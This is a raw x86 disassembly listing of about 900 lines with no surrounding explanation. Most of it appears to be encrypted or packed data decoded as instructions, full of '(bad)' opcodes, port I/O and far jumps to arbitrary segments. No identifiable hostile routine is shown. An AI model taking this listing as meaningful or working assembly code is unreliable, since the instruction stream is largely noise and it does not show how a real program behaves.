  40d7a3:	aas    
  40d7a4:	dec    ecx
  40d7a5:	loope  0x40d7cf
  40d7a7:	adc    edx,DWORD PTR [esi+0x7fe3d4c4]
  40d7ad:	xchg   ebp,eax
  40d7ae:	mov    gs,eax
  40d7b0:	xchg   ecx,eax
  40d7b1:	push   ebp
  40d7b2:	sub    BYTE PTR [ebp+ecx*4+0x283c724],ah
  40d7b9:	fld    TBYTE PTR [edi]
  40d7bb:	inc    edi
  40d7bc:	cwde   
  40d7bd:	xor    edx,esp
  40d7bf:	aad    0xa5
  40d7c1:	lods   al,BYTE PTR ds:[esi]
  40d7c2:	retf   
  40d7c3:	or     BYTE PTR [ecx+0x5c3bcfc4],0xda
  40d7ca:	ror    edx,0x2a
  40d7cd:	int    0x22
  40d7cf:	test   eax,0x77712571
  40d7d4:	cli    
  40d7d5:	inc    esi
  40d7d6:	push   edx
  40d7d7:	cli    
  40d7d8:	into   
  40d7d9:	gs push ebp
  40d7db:	imul   eax,DWORD PTR [eax+0x6c],0x2ba73007
  40d7e2:	mov    ah,0xfd
  40d7e4:	mov    bh,0xef
  40d7e6:	mov    ds:0x9549bd76,al
  40d7eb:	xchg   edx,eax
  40d7ec:	adc    BYTE PTR [edx+ecx*2+0x1d],0xb3
  40d7f1:	pop    ebx
  40d7f2:	mov    al,ds:0x982daec3
  40d7f7:	fmul   DWORD PTR [esi]
  40d7f9:	icebp  
  40d7fa:	in     eax,dx
  40d7fb:	push   edi
  40d7fc:	adc    al,0x42
  40d7fe:	add    ecx,ecx
  40d800:	dec    eax
  40d801:	cmp    DWORD PTR [eax-0x1b],eax
  40d804:	sbb    esi,DWORD PTR [ecx+0x7487af48]
  40d80a:	inc    ebx
  40d80b:	loop   0x40d7d2
  40d80d:	adc    DWORD PTR [eax],0x47
  40d810:	inc    edx
  40d811:	cmp    eax,0x37b8e4dc
  40d816:	mov    eax,0xbeef24e
  40d81b:	sub    BYTE PTR [edi-0x7f8a5e98],bl
  40d821:	push   cs
  40d822:	loop   0x40d7c8
  40d824:	cmp    DWORD PTR [ebx+0xdc60d45],esp
  40d82a:	push   ebp
  40d82b:	and    BYTE PTR [edi],cl
  40d82d:	aad    0xe9
  40d82f:	mov    dl,BYTE PTR [edx+eiz*2]
  40d832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d833:	je     0x40d85b
  40d835:	in     eax,dx
  40d836:	jp     0x40d83f
  40d838:	push   cs
  40d839:	dec    eax
  40d83a:	ffree  st(5)
  40d83c:	out    0x45,al
  40d83e:	mov    ah,0x55
  40d840:	aaa    
  40d841:	dec    ebp
  40d842:	sbb    BYTE PTR [ecx+eax*4+0x7793152d],ch
  40d849:	xchg   ebp,eax
  40d84a:	mov    edi,0xacf5bb00
  40d84f:	out    0xc8,al
  40d851:	(bad)  
  40d852:	mov    ebx,0x89731994
  40d857:	hlt    
  40d858:	fwait
  40d859:	std    
  40d85a:	fbstp  TBYTE PTR [ebx+0x16]
  40d85d:	test   ebp,ebp
  40d85f:	test   BYTE PTR [ecx],al
  40d861:	lea    edi,[edi*1+0x55bfa1b8]
  40d868:	pop    edx
  40d869:	je     0x40d8db
  40d86b:	xchg   BYTE PTR [ebx],cl
  40d86d:	(bad)  
  40d86e:	xor    bl,BYTE PTR [esi+0x54]
  40d871:	repz sar DWORD PTR [edx+0x427dd5ba],1
  40d878:	xor    ch,BYTE PTR [esi+0x39]
  40d87b:	cmp    BYTE PTR [edi+0x13],ch
  40d87e:	mov    eax,0x7139d0e4
  40d883:	push   ss
  40d884:	xchg   DWORD PTR [edx-0x6e],ebx
  40d887:	xor    eax,0x3842307b
  40d88c:	sub    eax,0xa954ecf4
  40d891:	outs   dx,BYTE PTR ss:[esi]
  40d893:	inc    edx
  40d894:	inc    ebp
  40d895:	jge    0x40d8bd
  40d897:	out    0xe,al
  40d899:	enter  0xaa28,0x49
  40d89d:	addr16 push 0x2b783681
  40d8a3:	xchg   ecx,eax
  40d8a4:	aad    0x21
  40d8a6:	and    DWORD PTR [esi],ecx
  40d8a8:	mov    bh,0x0
  40d8aa:	push   es
  40d8ab:	out    0xdf,al
  40d8ad:	dec    ecx
  40d8ae:	jmp    0x40d8d6
  40d8b0:	loop   0x40d909
  40d8b2:	imul   esi,ebx,0xffffff89
  40d8b5:	dec    ecx
  40d8b6:	daa    
  40d8b7:	inc    edx
  40d8b8:	mov    edi,0xb6afe811
  40d8bd:	leave  
  40d8be:	es out 0xeb,al
  40d8c1:	jg     0x40d882
  40d8c3:	je     0x40d893
  40d8c5:	inc    ebp
  40d8c6:	cmp    al,dh
  40d8c8:	pusha  
  40d8c9:	aaa    
  40d8ca:	pop    ebp
  40d8cb:	pop    es
  40d8cc:	repnz add BYTE PTR [eax],dh
  40d8cf:	sbb    bh,cl
  40d8d1:	add    ecx,DWORD PTR [eax+0x7094b4e1]
  40d8d7:	shl    al,0x4d
  40d8da:	mov    esi,0xdd0db670
  40d8df:	jmp    0x4468:0x95504488
  40d8e6:	pop    edi
  40d8e7:	pop    ss
  40d8e8:	ror    BYTE PTR [ebx],cl
  40d8ea:	dec    esi
  40d8eb:	popf   
  40d8ec:	or     DWORD PTR [ebp-0x71],0x25
  40d8f0:	out    0x2c,al
  40d8f2:	mov    bh,0x6c
  40d8f4:	inc    esi
  40d8f5:	mov    ebp,edi
  40d8f7:	loope  0x40d8c3
  40d8f9:	mov    bl,0xc1
  40d8fb:	pushf  
  40d8fc:	test   BYTE PTR [edi+0x5407a7c],dh
  40d902:	outs   dx,DWORD PTR ds:[esi]
  40d903:	xchg   ebp,eax
  40d904:	fst    QWORD PTR [ebx-0x71]
  40d907:	jge    0x40d8cc
  40d909:	mov    al,0x7e
  40d90b:	inc    ebx
  40d90c:	cmp    esi,0x56
  40d90f:	xor    bh,BYTE PTR [esi+0x40]
  40d912:	outs   dx,DWORD PTR ds:[esi]
  40d913:	mov    WORD PTR [edi-0x1f41dfb4],cs
  40d919:	ins    BYTE PTR es:[di],dx
  40d91b:	inc    ebp
  40d91c:	pushf  
  40d91d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d91e:	push   eax
  40d91f:	push   ebx
  40d920:	mov    ecx,0xa6b2bc5d
  40d925:	scas   eax,DWORD PTR es:[edi]
  40d926:	mov    ebp,0xd78d9b56
  40d92b:	pop    esi
  40d92c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d92d:	nop
  40d92e:	lea    esp,[edx-0x6e]
  40d931:	cmp    ah,BYTE PTR [ecx+0x4e5d34ce]
  40d937:	sub    DWORD PTR [edi+0x7f144556],esi
  40d93d:	rcl    ah,cl
  40d93f:	inc    eax
  40d940:	mov    ebx,0x67b9a813
  40d945:	sbb    dh,cl
  40d947:	xor    al,0xb5
  40d949:	mov    ebx,0xb25a5b4b
  40d94e:	or     al,0x29
  40d950:	sub    BYTE PTR [eax-0x451e9751],dl
  40d956:	jmp    0xf3e3:0x416aa828
  40d95d:	jl     0x40d8e9
  40d95f:	into   
  40d960:	or     BYTE PTR [ebx+0x1f16a7b0],dh
  40d966:	xchg   BYTE PTR [ebp+eiz*4+0x5f1ccd4c],cl
  40d96d:	cli    
  40d96e:	cmp    BYTE PTR [ebx+0x30],ah
  40d971:	inc    ebx
  40d972:	mov    bh,0x1b
  40d974:	xor    DWORD PTR [ecx+ebx*8],0xffffff9a
  40d978:	rcl    DWORD PTR [ecx],cl
  40d97a:	xchg   esp,eax
  40d97b:	scas   al,BYTE PTR es:[edi]
  40d97c:	je     0x40d98e
  40d97e:	clc    
  40d97f:	lahf   
  40d980:	pop    ss
  40d981:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d982:	scas   eax,DWORD PTR es:[edi]
  40d983:	push   ecx
  40d984:	div    ecx
  40d986:	inc    edx
  40d987:	sub    BYTE PTR [edx],bh
  40d989:	push   esi
  40d98a:	iret   
  40d98b:	cs popaw 
  40d98e:	push   0x63
  40d990:	and    BYTE PTR [esi-0x1b638317],dl
  40d996:	mov    eax,0xd6e4c8b5
  40d99b:	sub    ebp,DWORD PTR [ebp+0x5f]
  40d99e:	mov    edx,0x50956467
  40d9a3:	mov    esi,0xecf5368e
  40d9a8:	inc    edi
  40d9a9:	mov    cl,0x96
  40d9ab:	xchg   edi,eax
  40d9ac:	xchg   ecx,eax
  40d9ad:	push   ebp
  40d9ae:	scas   eax,DWORD PTR es:[edi]
  40d9af:	stos   BYTE PTR es:[edi],al
  40d9b0:	(bad)  
  40d9b1:	jg     0x40d963
  40d9b3:	retf   0x32e9
  40d9b6:	or     cl,dl
  40d9b8:	push   edx
  40d9b9:	sub    edi,DWORD PTR [esi-0x77]
  40d9bc:	sub    ecx,DWORD PTR [edi+ecx*4-0x46a6c1fa]
  40d9c3:	test   al,0xb3
  40d9c5:	pop    eax
  40d9c6:	xor    DWORD PTR [eax-0x767e94dc],esp
  40d9cc:	test   al,0x25
  40d9ce:	or     eax,0x8c036c05
  40d9d3:	lock fiadd WORD PTR [ebp-0x77ea0e7c]
  40d9da:	outs   dx,DWORD PTR ds:[esi]
  40d9db:	adc    ebp,DWORD PTR [ebx]
  40d9dd:	js     0x40da1e
  40d9df:	stc    
  40d9e0:	or     al,0x21
  40d9e2:	add    esi,DWORD PTR [ebx]
  40d9e4:	jmp    0x40d97c
  40d9e6:	lock cmp cl,cl
  40d9e9:	imul   edi,DWORD PTR [edi+0x1e],0xc49e503c
  40d9f0:	(bad)  
  40d9f1:	pop    ds
  40d9f2:	jae    0x40da27
  40d9f4:	sahf   
  40d9f5:	pusha  
  40d9f6:	jl     0x40da12
  40d9f8:	in     eax,dx
  40d9f9:	pop    edi
  40d9fa:	mov    al,ds:0xf7ad87a2
  40d9ff:	sbb    DWORD PTR [edi],edx
  40da01:	in     eax,0x51
  40da03:	mov    edi,0x93f47bf5
  40da08:	mov    cl,0x49
  40da0a:	and    cl,BYTE PTR [edx+0x2c]
  40da0d:	cs sbb al,0x5e
  40da10:	sub    BYTE PTR [esi+0x4123cf5a],ch
  40da16:	sbb    DWORD PTR [esi+esi*8-0x611fb557],ebp
  40da1d:	push   edi
  40da1e:	add    ecx,0xd6f07169
  40da24:	inc    ebx
  40da25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da26:	cmp    al,0x53
  40da28:	call   0x2abe:0xde583cd0
  40da2f:	mov    ch,0xed
  40da31:	arpl   WORD PTR [ebp-0xbd8ac70],si
  40da37:	dec    edi
  40da38:	push   es
  40da39:	and    edi,DWORD PTR [edi+0x30]
  40da3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da3d:	mov    ds:0x596e7194,eax
  40da42:	or     al,0x8d
  40da44:	dec    ebp
  40da45:	cs add eax,0x8e3984d5
  40da4b:	pushf  
  40da4c:	sbb    dl,ah
  40da4e:	xor    edi,eax
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0x30,eax
  40da6e:	test   BYTE PTR [ebp-0x38],0x32
  40da72:	mov    ds:0x79707e7e,al
  40da77:	jle    0x40daf7
  40da79:	lea    edi,[edi-0x772061a7]
  40da7f:	mov    al,0xf2
  40da82:	popf   
  40da83:	aaa    
  40da84:	xor    BYTE PTR [ebp-0x4e6136c0],0xbe
  40da8b:	adc    cl,BYTE PTR [edx]
  40da8d:	xchg   esp,eax
  40da8e:	sub    ebp,eax
  40da90:	cdq    
  40da91:	add    al,0x6d
  40da93:	dec    edx
  40da94:	cmp    DWORD PTR [esi],0xd8e64003
  40da9a:	jge    0x40da2e
  40da9c:	je     0x40dae1
  40da9e:	and    dl,dl
  40daa0:	in     al,dx
  40daa1:	fwait
  40daa2:	and    DWORD PTR [esi+ebp*2-0x1c],ebx
  40daa6:	dec    ecx
  40daa7:	xor    DWORD PTR [ebx+0x31],edx
  40daaa:	push   es
  40daab:	(bad)  
  40daac:	jmp    0x87f3:0xd271a950
  40dab3:	mov    esp,0xfbcb58db
  40dab8:	push   edx
  40dab9:	test   al,0xcb
  40dabb:	mov    edx,0x95a4f9a3
  40dac0:	jmp    0x40daa2
  40dac2:	nop
  40dac3:	dec    BYTE PTR [edi]
  40dac5:	cmp    ch,dl
  40dac7:	pmulhw mm6,QWORD PTR [ecx+0x3e3b5df6]
  40dace:	in     al,dx
  40dacf:	and    ch,bl
  40dad1:	xor    cl,dh
  40dad3:	push   cs
  40dad4:	hlt    
  40dad5:	xchg   esp,eax
  40dad6:	or     edi,DWORD PTR [eax-0x1c]
  40dad9:	jle    0x40da84
  40dadb:	inc    edi
  40dadc:	mov    edx,0xe05759f7
  40dae1:	data16 icebp 
  40dae3:	repz aaa 
  40dae5:	jecxz  0x40dac1
  40dae7:	ret    
  40dae8:	loopne 0x40dad7
  40daea:	mov    esp,es
  40daec:	push   ds
  40daed:	xor    edi,DWORD PTR [ebx+0x8865cb4]
  40daf3:	push   edx
  40daf4:	pusha  
  40daf5:	xchg   ecx,eax
  40daf6:	call   0x680f:0x943efe16
  40dafd:	push   es
  40dafe:	mov    ah,0x59
  40db00:	mov    ebp,0xfdf9ad42
  40db05:	mov    ss,WORD PTR [ebp-0x54]
  40db08:	dec    edx
  40db09:	leave  
  40db0a:	push   eax
  40db0b:	and    esi,DWORD PTR [esi]
  40db0d:	mov    ss,WORD PTR [edx-0x1b]
  40db10:	cli    
  40db11:	rcr    BYTE PTR [ebp-0x55],cl
  40db14:	dec    eax
  40db15:	stos   DWORD PTR es:[edi],eax
  40db16:	xor    DWORD PTR [ebx+0x2312d37b],eax
  40db1c:	dec    ebp
  40db1d:	fwait
  40db1e:	lds    ebp,FWORD PTR [edx+0x109656e6]
  40db24:	fdiv   DWORD PTR [ebx+0x3f9a3901]
  40db2a:	das    
  40db2b:	cmc    
  40db2c:	or     ch,BYTE PTR [ebx+0x64]
  40db2f:	add    al,BYTE PTR [eax+0x1f6fda53]
  40db35:	dec    eax
  40db36:	sub    DWORD PTR [eax+0x54],edi
  40db39:	pop    esi
  40db3a:	call   0x7b8e:0x159d9798
  40db41:	cmp    ah,BYTE PTR [ebx+0x67eb2f34]
  40db47:	(bad)  
  40db48:	retf   
  40db49:	sbb    DWORD PTR [eax],esp
  40db4b:	hlt    
  40db4c:	dec    ecx
  40db4d:	retf   0x624a
  40db50:	fistp  DWORD PTR [edi]
  40db52:	out    dx,al
  40db53:	scas   al,BYTE PTR es:[edi]
  40db54:	mov    ah,0xf6
  40db56:	call   0x57cf12f0
  40db5b:	push   ebx
  40db5c:	and    al,0x2f
  40db5e:	hlt    
  40db5f:	mov    edi,0x8a2c3802
  40db64:	nop
  40db65:	pop    eax
  40db66:	adc    al,0xf8
  40db68:	daa    
  40db69:	gs push ds
  40db6b:	xchg   esp,eax
  40db6c:	(bad)  
  40db6e:	dec    edi
  40db6f:	fisttp DWORD PTR [ecx]
  40db71:	enter  0xfee5,0xf5
  40db75:	(bad)  
  40db76:	jns    0x40dbab
  40db78:	mov    bh,0x43
  40db7a:	lahf   
  40db7b:	shl    al,0x69
  40db7e:	mov    eax,ds:0x10364082
  40db83:	fild   QWORD PTR [edx-0x6d]
  40db86:	adc    ch,BYTE PTR [edi+0x3d]
  40db89:	inc    ecx
  40db8a:	inc    esp
  40db8b:	cli    
  40db8c:	and    al,0x52
  40db8e:	sbb    DWORD PTR [edi+ecx*8-0x58dc2a42],ebx
  40db95:	test   al,0xf
  40db97:	je     0x2eb4b585
  40db9d:	xor    al,0x25
  40db9f:	add    DWORD PTR [edx+0x7faf0b0e],0xdb8a455d
  40dba9:	mov    ds:0x65ae34e4,eax
  40dbae:	jmp    0xb512f575
  40dbb3:	imul   BYTE PTR [eax+0x7e]
  40dbb6:	sbb    al,0xaf
  40dbb8:	adc    ebx,edx
  40dbba:	aam    0x2b
  40dbbc:	sub    esi,edx
  40dbbe:	or     BYTE PTR [ecx],0x13
  40dbc1:	rcl    cl,0xd1
  40dbc4:	in     al,0x69
  40dbc6:	js     0x40dc29
  40dbc8:	push   ecx
  40dbc9:	ret    
  40dbca:	mov    ecx,0x7bd7e997
  40dbcf:	daa    
  40dbd0:	clc    
  40dbd1:	jmp    0x2c940460
  40dbd6:	cs repnz into 
  40dbd9:	popa   
  40dbda:	rol    DWORD PTR [eax],cl
  40dbdc:	mov    ds:0xadbff24f,eax
  40dbe1:	cmp    al,0xf0
  40dbe3:	inc    ebx
  40dbe4:	xchg   ebx,eax
  40dbe5:	enter  0x51d8,0xf8
  40dbe9:	cli    
  40dbea:	sti    
  40dbeb:	xor    ebp,DWORD PTR [edi]
  40dbed:	and    eax,ebx
  40dbef:	ss (bad) 
  40dbf2:	cmp    ah,BYTE PTR [ebp-0x2d3e2059]
  40dbf8:	outs   dx,BYTE PTR ds:[esi]
  40dbf9:	(bad)  
  40dbfa:	aam    0xa1
  40dbfc:	lods   eax,DWORD PTR ds:[esi]
  40dbfd:	add    bl,BYTE PTR [edi+0x1db77971]
  40dc03:	in     eax,dx
  40dc04:	mov    esi,0x81033d7c
  40dc09:	adc    DWORD PTR [eax-0x57bd4744],esp
  40dc0f:	xor    esp,ebp
  40dc11:	and    al,BYTE PTR [ecx]
  40dc13:	jmp    FWORD PTR [ebx-0x7149893f]
  40dc19:	push   edi
  40dc1a:	aas    
  40dc1b:	addr16 retf 0xd974
  40dc1f:	mov    ds:0x7a3eaadc,eax
  40dc24:	call   DWORD PTR [esi]
  40dc26:	call   0x7a68b984
  40dc2b:	inc    esi
  40dc2c:	mov    DWORD PTR [ecx],ebx
  40dc2e:	or     dh,BYTE PTR [eax]
  40dc30:	mov    dl,0x58
  40dc32:	scas   eax,DWORD PTR es:[edi]
  40dc33:	pushf  
  40dc34:	cmp    DWORD PTR [eax+0x3a],0x7189627b
  40dc3b:	(bad)  
  40dc3c:	clc    
  40dc3d:	pop    edx
  40dc3e:	sbb    eax,0x4fc7ed88
  40dc43:	rcr    DWORD PTR [edi+ecx*4-0x3f],1
  40dc47:	push   0xae02fcba
  40dc4c:	fcomi  st,st(7)
  40dc4e:	inc    ecx
  40dc4f:	leave  
  40dc50:	push   cs
  40dc51:	xlat   BYTE PTR ds:[ebx]
  40dc52:	lods   eax,DWORD PTR ds:[esi]
  40dc53:	fild   DWORD PTR [ecx]
  40dc55:	inc    ebp
  40dc56:	les    ecx,FWORD PTR [esi]
  40dc58:	frstor [eax+0x67d84843]
  40dc5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc5f:	inc    esp
  40dc60:	pop    ebx
  40dc61:	ins    BYTE PTR es:[edi],dx
  40dc62:	test   esi,edx
  40dc64:	dec    esi
  40dc65:	gs inc eax
  40dc67:	dec    edx
  40dc68:	cmp    ecx,DWORD PTR ds:0xf208dac3
  40dc6e:	ror    BYTE PTR [edi],cl
  40dc70:	or     al,0x26
  40dc72:	push   esp
  40dc73:	push   ss
  40dc74:	fs aas 
  40dc76:	pop    edx
  40dc77:	cdq    
  40dc78:	popa   
  40dc79:	jg     0x40dc36
  40dc7b:	stos   DWORD PTR es:[edi],eax
  40dc7c:	xchg   esi,eax
  40dc7d:	xor    eax,0xc314f75b
  40dc82:	fwait
  40dc83:	enter  0xe51b,0x70
  40dc87:	cdq    
  40dc88:	jg     0x40dd08
  40dc8a:	push   ds
  40dc8b:	stos   DWORD PTR es:[edi],eax
  40dc8c:	mov    dl,0xe8
  40dc8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc8f:	mov    edx,0x6550af9d
  40dc94:	ror    DWORD PTR [ebp+0x38],cl
  40dc97:	out    0x22,al
  40dc99:	bnd ret 
  40dc9b:	dec    ebp
  40dc9c:	dec    esi
  40dc9d:	(bad)  
  40dc9e:	rcl    DWORD PTR [esi+0x2da8fa67],cl
  40dca4:	fucom  st(1)
  40dca6:	jnp    0x40dc95
  40dca8:	mov    esp,0x4baf90c2
  40dcad:	mov    edx,0xbbcc0683
  40dcb2:	mov    ds:0x3ce7d068,al
  40dcb7:	nop
  40dcb8:	cld    
  40dcb9:	mov    ebx,DWORD PTR [edi]
  40dcbb:	frstor [ebx+0x28272ff0]
  40dcc1:	iret   
  40dcc2:	psllw  mm0,QWORD PTR [edi+0xd3f095b]
  40dcc9:	xor    al,dh
  40dccb:	push   ds
  40dccc:	dec    ebp
  40dccd:	cmc    
  40dcce:	jecxz  0x40dc60
  40dcd0:	fld    QWORD PTR [ebp-0x171d0b14]
  40dcd6:	or     al,0x65
  40dcd8:	push   0x6eb7c175
  40dcdd:	lods   eax,DWORD PTR ds:[esi]
  40dcde:	dec    esi
  40dcdf:	int    0x3c
  40dce1:	xor    ebp,ecx
  40dce3:	fcom   QWORD PTR [esi+esi*4+0x5c68d761]
  40dcea:	cmc    
  40dceb:	mov    DWORD PTR [ebx-0xf],edi
  40dcee:	test   BYTE PTR [esi+0x2ce38a7e],al
  40dcf4:	xchg   ebp,eax
  40dcf5:	dec    ebp
  40dcf6:	fist   DWORD PTR [esi+ebp*4+0x2f]
  40dcfa:	xchg   edx,eax
  40dcfb:	mov    eax,0x9e695a9
  40dd00:	push   edx
  40dd01:	ds popf 
  40dd03:	mov    ah,0xec
  40dd05:	push   ecx
  40dd06:	test   BYTE PTR [esi],cl
  40dd08:	bound  edi,QWORD PTR ds:0x1b118181
  40dd0e:	sar    BYTE PTR [edx-0x71b1f3a6],cl
  40dd14:	lock fsub st(7),st
  40dd17:	jb     0x40dcd5
  40dd19:	xlat   BYTE PTR ds:[ebx]
  40dd1a:	cmp    al,cl
  40dd1c:	sti    
  40dd1d:	pop    eax
  40dd1e:	mov    dl,0x8d
  40dd20:	sti    
  40dd21:	mov    bl,0x91
  40dd23:	inc    ebx
  40dd24:	sbb    BYTE PTR [esi+0x758fac18],ah
  40dd2a:	pop    edx
  40dd2b:	mov    cl,0x8e
  40dd2d:	xchg   esi,eax
  40dd2e:	loope  0x40dcf3
  40dd30:	ret    
  40dd31:	out    0xd3,eax
  40dd33:	ret    
  40dd34:	adc    al,0xa3
  40dd36:	retf   0xf4be
  40dd39:	mov    cl,0x61
  40dd3b:	cmp    BYTE PTR [esi],al
  40dd3d:	ror    dh,cl
  40dd3f:	push   esp
  40dd40:	das    
  40dd41:	push   esi
  40dd42:	and    eax,0xf0daaa75
  40dd47:	test   eax,0xf3060bac
  40dd4c:	adc    al,0x50
  40dd4e:	test   DWORD PTR [eax+0x36],edi
  40dd51:	inc    ebx
  40dd52:	loopne 0x40dcfe
  40dd54:	data16 arpl WORD PTR [edx+ebp*2+0x6ff5b28d],dx
  40dd5c:	xor    ah,dh
  40dd5e:	cmp    DWORD PTR [esi],edx
  40dd60:	mov    ebx,0x38593126
  40dd65:	test   al,0x13
  40dd67:	adc    BYTE PTR [ebp+0x33],0x18
  40dd6b:	jno    0x40dd98
  40dd6d:	loop   0x40dd72
  40dd6f:	dec    esp
  40dd70:	pusha  
  40dd71:	jl     0x40ddaa
  40dd73:	pusha  
  40dd74:	ror    DWORD PTR [edi+0x5f7e4259],0xb4
  40dd7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd7c:	aas    
  40dd7d:	fwait
  40dd7e:	add    ecx,DWORD PTR [edx+0x19]
  40dd81:	inc    ebp
  40dd82:	psrad  mm2,mm3
  40dd85:	nop
  40dd86:	gs call 0x6ed415c0
  40dd8c:	cld    
  40dd8d:	adc    BYTE PTR [eax+0xfd71c2],dh
  40dd93:	jecxz  0x40dde2
  40dd95:	adc    bh,ch
  40dd97:	xchg   esi,eax
  40dd98:	mov    al,ds:0x29b21cd9
  40dd9d:	xor    BYTE PTR [ecx-0x5d],dl
  40dda0:	inc    edi
  40dda1:	mov    eax,0x3ce6701b
  40dda6:	or     DWORD PTR [ebx+0x5e],edi
  40dda9:	imul   eax,DWORD PTR [edx+0x2c],0xffffffeb
  40ddad:	xchg   ebx,eax
  40ddae:	or     DWORD PTR [ecx-0x23],edi
  40ddb1:	pop    edi
  40ddb2:	jnp    0x40dd3d
  40ddb4:	jne    0x40de2f
  40ddb6:	or     eax,0x123123cb
  40ddbb:	rcl    DWORD PTR [edi-0x3c],cl
  40ddbe:	dec    BYTE PTR [ecx]
  40ddc0:	xchg   ecx,eax
  40ddc1:	test   DWORD PTR [ebp-0x711695c],esi
  40ddc7:	inc    edi
  40ddc8:	out    0x25,al
  40ddca:	sbb    BYTE PTR [eax-0x5b],ch
  40ddcd:	xchg   ebx,eax
  40ddce:	xchg   ecx,eax
  40ddcf:	mov    DWORD PTR [edx],esi
  40ddd1:	push   ebx
  40ddd2:	fistp  WORD PTR [ecx]
  40ddd4:	fs es jg 0x40de1f
  40ddd8:	(bad)  
  40ddd9:	add    eax,0x6e618367
  40ddde:	push   ebx
  40dddf:	gs push ecx
  40dde1:	fistp  WORD PTR ds:0xa0d0c97f
  40dde7:	jno    0x40de25
  40dde9:	stc    
  40ddea:	mov    BYTE PTR [edx+0x3f9f8bf5],cl
  40ddf0:	xor    edi,eax
  40ddf2:	mov    ?,esi
  40ddf4:	cmp    bh,BYTE PTR [ebp+0x3b]
  40ddf7:	iret   
  40ddf8:	daa    
  40ddf9:	push   edi
  40ddfa:	arpl   dx,bx
  40ddfc:	push   ebp
  40ddfd:	mov    bh,BYTE PTR [bx]
  40de00:	mov    ecx,DWORD PTR [ecx-0x16]
  40de03:	fmul   QWORD PTR [bp+0x39]
  40de07:	add    eax,DWORD PTR [esi-0x4d790d00]
  40de0d:	call   0x7236:0xaa5a1efc
  40de14:	jns    0x40ddee
  40de16:	xchg   BYTE PTR [ecx+0x41],bl
  40de19:	or     edi,DWORD PTR [eax]
  40de1b:	test   eax,0x4600911e
  40de20:	sub    DWORD PTR [esp+esi*2-0x3b],edx
  40de24:	into   
  40de25:	inc    esp
  40de26:	and    al,0xf
  40de28:	mov    ah,0x2d
  40de2a:	call   0x9f24:0xfcaacad0
  40de31:	sbb    DWORD PTR [edx-0x3c],esp
  40de34:	test   al,0xd1
  40de36:	ret    0x41ea
  40de39:	icebp  
  40de3a:	xchg   edx,eax
  40de3b:	mov    ds:0x207eee12,eax
  40de40:	ret    
  40de41:	pop    ecx
  40de42:	ja     0x40ddf6
  40de44:	retf   0x51b
  40de47:	popf   
  40de48:	xor    eax,0x67847d3a
  40de4d:	cld    
  40de4e:	ror    DWORD PTR [eax],1
  40de50:	xchg   dl,bh
  40de52:	mov    ebx,0x487b5778
  40de57:	add    BYTE PTR [edi+0x23607ea4],dh
  40de5d:	scas   al,BYTE PTR es:[edi]
  40de5e:	cli    
  40de5f:	xchg   edx,eax
  40de60:	xchg   edx,eax
  40de61:	add    dh,ah
  40de63:	out    0x27,eax
  40de65:	xor    eax,0x617a2e64
  40de6a:	arpl   WORD PTR [edx-0x1],dx
  40de6d:	not    DWORD PTR [ecx-0x2d]
  40de70:	cmp    eax,ebx
  40de72:	mov    al,ds:0x8bf85589
  40de77:	push   ebp
  40de78:	loopne 0x40dead
  40de7a:	sar    BYTE PTR [edi-0x327299],1
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	jne    0x40deb1
  40de93:	cmp    BYTE PTR ds:0x7e7eae34,al
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	mov    dh,0x1
  40de9f:	adc    ecx,DWORD PTR [ecx+0x798a155e]
  40dea5:	in     eax,0x49
  40dea7:	fwait
  40dea8:	mov    bl,0xcc
  40deaa:	iret   
  40deab:	(bad)  
  40deac:	out    dx,eax
  40dead:	pop    ebp
  40deae:	shr    BYTE PTR [edx],cl
  40deb0:	or     DWORD PTR [edi+0x6d052395],ebx
  40deb6:	je     0x40de4c
  40deb8:	xchg   esp,eax
  40deb9:	push   ebp
  40deba:	stos   BYTE PTR es:[edi],al
  40debb:	inc    esp
  40debc:	scas   al,BYTE PTR es:[edi]
  40debd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40debe:	mov    DWORD PTR [edi+0x5eed0c91],esp
  40dec4:	fiadd  DWORD PTR [ebx-0x31]
  40dec7:	mov    al,0x64
  40dec9:	retf   0xddb9
  40decc:	fucomi st,st(7)
  40dece:	adc    ah,BYTE PTR [ecx+0x55]
  40ded1:	mov    ch,0x85
  40ded3:	inc    edx
  40ded4:	outs   dx,DWORD PTR ds:[esi]
  40ded5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ded6:	sahf   
  40ded7:	add    al,0x35
  40ded9:	or     al,0x39
  40dedb:	adc    al,BYTE PTR [eax+0x75]
  40dede:	pop    eax
  40dedf:	jl     0x40df5e
  40dee1:	mov    edx,0x7185b62a
  40dee6:	cwde   
  40dee7:	adc    esp,esp
  40dee9:	mov    esp,DWORD PTR [eax-0x1e]
  40deec:	sbb    al,0xd
  40deee:	mov    edx,ebx
  40def0:	pop    es
  40def1:	cmp    ch,BYTE PTR [eax]
  40def3:	push   cs
  40def4:	(bad)  
  40def5:	adc    al,0x94
  40def7:	mov    bl,0x8c
  40def9:	xor    esi,DWORD PTR ds:0x64349a03
  40deff:	xchg   edi,eax
  40df00:	fisttp WORD PTR [edi-0x5f]
  40df03:	and    bh,BYTE PTR [edx+0x41]
  40df06:	(bad)  
  40df08:	das    
  40df09:	xor    al,0xe3
  40df0b:	ror    BYTE PTR [eax-0x53],1
  40df0e:	sbb    bl,dl
  40df10:	jmp    0x40dece
